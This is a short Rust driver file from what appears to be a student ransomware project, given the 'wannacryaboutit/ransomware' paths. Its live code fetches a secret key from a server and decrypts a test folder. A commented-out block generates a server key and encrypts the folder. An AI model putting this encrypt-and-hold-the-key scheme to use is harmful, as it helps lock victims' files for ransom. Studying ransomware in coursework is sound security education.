use anyhow::Result;

use crate::cryptography::encrypt::encrypt_folder;
use crate::cryptography::encrypt::decrypt_folder;
use crate::networking::client::gen_key;
use crate::networking::client::get_key;

use std::path::Path;
use std::fs;

use sodiumoxide::crypto::box_::{PublicKey, SecretKey};

// ENCRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    // DECRYPT
    let pk_bytes = fs::read("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test/public_key.donotdelete")?;
    let pk = PublicKey::from_slice(&pk_bytes)
        .ok_or("key not good")? as PublicKey;

    let sk = get_key(&pk).await?;

    let path = Path::new("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test");

    match decrypt_folder(path, &pk, &sk) {
        Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
        Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
    }

    Ok(())

    // ENCRYPT
    // let pk: PublicKey = gen_key().await?;

    // let path = Path::new("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test");

    // match encrypt_folder(path, &pk) {
    //     Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
    //     Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
    // }

    // fs::write("/Users/rik/dev/2IC80-wannacryaboutit/ransomware/src/test/public_key.donotdelete", &pk)?;

    // Ok(())
}